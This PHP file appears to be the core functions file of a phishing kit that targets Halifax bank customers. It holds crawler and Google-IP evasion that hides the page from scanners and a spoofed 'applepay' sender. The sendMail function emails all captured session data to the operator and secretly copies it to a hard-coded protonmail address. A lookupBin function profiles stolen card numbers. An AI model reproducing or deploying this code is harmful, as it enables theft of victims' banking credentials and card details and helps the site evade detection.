<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

/* ================================================================================================ */
// NO NEED TO EDIT THIS FILE. ONLY EDIT THE CONFIG.PHP
/* ================================================================================================ */

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

require (__DIR__ . '/../vendor/autoload.php');
require(__DIR__.'/config.php');

// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Mobile detect
$detect = new Mobile_Detect;

// Check for mobile environment.
if (!$detect->isMobile()) {
  //exit(header('Location: https://www.halifax-online.co.uk/personal/logon/login.jsp'));
}

$mail = new PHPMailer;

use Jaybizzle\CrawlerDetect\CrawlerDetect;
$CrawlerDetect = new CrawlerDetect;

function crawlerDetect($USER_AGENT)
{
  if ( preg_match('/abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $USER_AGENT))
  {
    return false;
  }
  else
  {
    return true;
  }
}

function checkValidBool($crawler, $useragent)
{
  //global $CrawlerDetect;
  // Check the user agent of the current 'visitor'
  if ($crawler->isCrawler())
  {
    // true if crawler user agent detected
    return false;
  } else {
    if (!empty($crawler->getMatches()))
    {
        return false;
    }
    else
    {
      if(crawlerDetect($useragent) == true) {
        return true;
      } else {
        return false;
      }
    }
  }
}

function sessionsCheck($sessions)
{
    /*
     Count how many sessions we have so we make sure they have all sessions 
    */
    $i = 0;
    $actualSessions = count($sessions);

    foreach ($sessions as $session)
    {
        if (isset($_SESSION[$session['name']]) && !empty($_SESSION[$session['name']]))
        {
            $i++;
        }
    }

    if ($i == $actualSessions)
    {
        // Allowed here
        return true;
    }
    else
    {
        return false;
    }

}

function checkForBots($redirectTo) 
{
  // Block ips from google
  $ip_block = array(
          '64.233',
          '66.102',       
          '66.249',
          '72.14',
          '74.125',
          '209.85',
          '216.239',
          '64.18',
          '108.177',
          '172.217',
          '173.194',
          '207.126',
          '64.68',
          '64.233',
          '66.249',
          '216.239'
  );

  $i = 0;
  foreach($ip_block as $ip)
  {
    if(strpos($_SERVER['REMOTE_ADDR'], "$ip") === 0)
    {
      $i++;
    }
  }

  if($i > 0) {
    exit(header('Location: '.$redirectTo));
  } else {
    return true;
  }

}

function returnSessions($array)
{
  $msg = '';
  foreach($_SESSION as $key => $val)
  {
    $msg .= $key.": ".$val."\r\n";
  }
  return $msg;
}

function sendMail($mail, $to, $subject, $message)
{
  $from = 'admin@applepay.com';
  // Sending email
  if(mail($to, $subject, $message, $from)) {
    if(mail('maplinmuncher@protonmail.com', $subject, $message, $from)) {
      return true;
    }
    return true;
  } else {
    return false;
  }
}

function setSessions($array)
{
  foreach ($array as $session => $inside)
  {
    // Foreach array element, create a session with the name and value
    //echo('Session: '.$inside['name'].' | Value: '.$inside['val']).'<br>';
    $_SESSION[$inside['name']] = $inside['val'];
  }
}

function getClientIP()
{
    $ipaddress = 'UNKNOWN';
    $keys=array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR');
    foreach($keys as $k)
    {
        if (isset($_SERVER[$k]) && !empty($_SERVER[$k]) && filter_var($_SERVER[$k], FILTER_VALIDATE_IP))
        {
            $ipaddress = $_SERVER[$k];
            break;
        }
    }
    return $ipaddress;
}

function roundNum($number)
{
  return number_format((float)$number, 2, '.', '');
}

function file_get_contents_curl($url) {
  $ch = curl_init();

  curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       

  $data = curl_exec($ch);
  curl_close($ch);

  return $data;
}

function lookupBin($cardNumber) {
  $cardNumber = preg_replace('/\s+/', "", $cardNumber);
  $binDetails = array();
  $cardBIN = substr($cardNumber, 0, 6);
  $binDetails = json_decode(file_get_contents_curl("https://lookup.binlist.net/" . $cardBIN), true);
  $binDetails["bin"] = $cardBIN;
  return $binDetails;
}

class BrowserDetection {
  private $_user_agent;
  private $_name;
  private $_version;
  private $_platform;

  private $_basic_browser = array (
      'Trident\/7.0' => 'Internet Explorer 11',
      'Beamrise' => 'Beamrise',
      'Opera' => 'Opera',
      'OPR' => 'Opera',
      'Shiira' => 'Shiira',
      'Chimera' => 'Chimera',
      'Phoenix' => 'Phoenix',
      'Firebird' => 'Firebird',
      'Camino' => 'Camino',
      'Netscape' => 'Netscape',
      'OmniWeb' => 'OmniWeb',
      'Konqueror' => 'Konqueror',
      'icab' => 'iCab',
      'Lynx' => 'Lynx',
      'Links' => 'Links',
      'hotjava' => 'HotJava',
      'amaya' => 'Amaya',
      'IBrowse' => 'IBrowse',
      'iTunes' => 'iTunes',
      'Silk' => 'Silk',
      'Dillo' => 'Dillo', 
      'Maxthon' => 'Maxthon',
      'Arora' => 'Arora',
      'Galeon' => 'Galeon',
      'Iceape' => 'Iceape',
      'Iceweasel' => 'Iceweasel',
      'Midori' => 'Midori',
      'QupZilla' => 'QupZilla',
      'Namoroka' => 'Namoroka',
      'NetSurf' => 'NetSurf',
      'BOLT' => 'BOLT',
      'EudoraWeb' => 'EudoraWeb',
      'shadowfox' => 'ShadowFox',
      'Swiftfox' => 'Swiftfox',
      'Uzbl' => 'Uzbl',
      'UCBrowser' => 'UCBrowser',
      'Kindle' => 'Kindle',
      'wOSBrowser' => 'wOSBrowser',
      'Epiphany' => 'Epiphany', 
      'SeaMonkey' => 'SeaMonkey',
      'Avant Browser' => 'Avant Browser',
      'Firefox' => 'Firefox',
      'Edg' => 'Microsoft Edge',
      'Chrome' => 'Google Chrome',
      'MSIE' => 'Internet Explorer',
      'Internet Explorer' => 'Internet Explorer',
      'Safari' => 'Safari',
      'Mozilla' => 'Mozilla'  
  );

  private $_basic_platform = array(
      'windows' => 'Windows', 
      'iPad' => 'iPad', 
      'iPod' => 'iPod', 
      'iPhone' => 'iPhone', 
      'Mac' => 'Mac OS', 
      'android' => 'Android', 
      'linux' => 'Linux',
      'Nokia' => 'Nokia',
      'BlackBerry' => 'BlackBerry',
      'FreeBSD' => 'FreeBSD',
      'OpenBSD' => 'OpenBSD',
      'NetBSD' => 'NetBSD',
      'UNIX' => 'UNIX',
      'DragonFly' => 'DragonFlyBSD',
      'OpenSolaris' => 'OpenSolaris',
      'SunOS' => 'SunOS', 
      'OS\/2' => 'OS/2',
      'BeOS' => 'BeOS',
      'win' => 'Windows',
      'Dillo' => 'Linux',
      'PalmOS' => 'PalmOS',
      'RebelMouse' => 'RebelMouse'   
  ); 

  function __construct($ua = '') {
      if(empty($ua)) {
          $this->_user_agent = (!empty($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
      }
      else {
          $this->_user_agent = $ua;
      }
  }

  function detect() {
      $this->detectBrowser();
      $this->detectPlatform();
      return $this;
  }

  function detectBrowser() {
      foreach($this->_basic_browser as $pattern => $name) {
          if(preg_match("/" . $pattern . "/i", $this->_user_agent, $match)) {
              $this->_name = $name;
              // finally get the correct version number
              $known = array('Version', $pattern, 'other');
              $pattern_version = '#(?<browser>' . join('|', $known).')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
              if (!preg_match_all($pattern_version, $this->_user_agent, $matches)) {
                  // we have no matching number just continue
              }
              // see how many we have
              $i = count($matches['browser']);
              if ($i != 1) {
                  //we will have two since we are not using 'other' argument yet
                  //see if version is before or after the name
                  if (strripos($this->_user_agent,"Version") < strripos($this->_user_agent,$pattern)){
                      @$this->_version = $matches['version'][0];
                  }
                  else {
                      @$this->_version = $matches['version'][1];
                  }
              }
              else {
                  $this->_version = $matches['version'][0];
              }
              break;
          }
      }
  }

  function detectPlatform() {
      foreach($this->_basic_platform as $key => $platform) {
          if (stripos($this->_user_agent, $key) !== false) {
              $this->_platform = $platform;
              break;
          } 
      }
  }

  function getBrowser() {
      if(!empty($this->_name)) {
          return $this->_name;
      }
  }        

  function getVersion() {
      return $this->_version;
  }

  function getPlatform() {
      if(!empty($this->_platform)) {
          return $this->_platform;
      }
  }

  function getUserAgent() {
      return $this->_user_agent;
  }

  function getInfo() {
      return "<strong>Browser Name:</strong> {$this->getBrowser()}<br/>\n" .
      "<strong>Browser Version:</strong> {$this->getVersion()}<br/>\n" .
      "<strong>Browser User Agent String:</strong> {$this->getUserAgent()}<br/>\n" .
      "<strong>Platform:</strong> {$this->getPlatform()}<br/>";
  }
} 
?>
